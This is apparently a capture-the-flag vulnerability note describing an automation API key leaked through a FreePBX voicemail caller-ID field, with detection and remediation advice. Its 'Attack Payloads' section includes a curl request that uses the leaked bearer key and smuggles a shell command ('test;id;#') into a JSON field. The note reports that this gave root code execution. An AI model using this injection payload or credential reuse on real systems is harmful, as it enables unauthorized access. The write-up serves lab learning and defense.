```markdown
# API Key Transmitted via Voicemail

**Tags:** `#voip` `#credential-leak` `#freepbx` `#api-key`

**CWE:** CWE-359 (Exposure of Private Personal Information)

**OWASP:** A04:2021 – Insecure Design

**Severity:** High (CVSS ~7.5)

---

## Description

A sensitive API authentication key is transmitted as a voicemail message in a VoIP system. Anyone with access to the voicemail inbox can retrieve the key and use it to authenticate to backend automation services.

---

## Vulnerable Pattern

Voicemail inbox message:
```
Date: Tue, Jun 30, 2026 9:31 AM
CID: "Automation Key cc_auto_7b3f9a1c4e0d2f6a" <9000>
Duration: 3 seconds
```

The voicemail contains the automation API key `cc_auto_7b3f9a1c4e0d2f6a` and a hint pointing to port `<9000>`.

---

## Attack Payloads

**1. Access the voicemail inbox:**
Log into FreePBX UCP with compromised credentials and navigate to the voicemail section.

**2. Extract the API key:**
Read the voicemail message to obtain the automation key and the port number.

**3. Use the key against the automation endpoint:**
```
curl -X POST http://127.0.0.1:9000/jobs/export \
  -H "Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a" \
  -H "Content-Type: application/json" \
  -d '{"report":"test;id;#"}'
```

---

## Detection

**Static:** Review voicemail storage and notification systems for plaintext secrets. Check if API keys appear in VoIP logs.

**Dynamic:** After gaining access to any communication system (email, voicemail, chat), search for keywords: `key`, `token`, `secret`, `password`, `credential`.

---

## Remediation

1. Never transmit API keys via voicemail, email, or chat systems
2. Use a secure secret distribution mechanism (vault, sealed secrets, one-time links)
3. Rotate any keys that were transmitted insecurely
4. Implement secret scanning in message systems to detect and alert on key patterns

---

## Rooms Seen

| Room | Context | Date |
|------|---------|------|
| Infinity Pool (Hacker Holidays 2026) | FreePBX voicemail contained automation API key `cc_auto_7b3f9a1c4e0d2f6a` with port hint `<9000>`, enabling root RCE on the automation worker | Aug 2026 |

---

## Related

- Hardcoded Template Credentials — how we accessed the FreePBX UCP to read the voicemail
- Unauthenticated API Credential Leak — how we got the FreePBX login
- Self-Documenting Health Endpoint — where we learned how to use the key
```
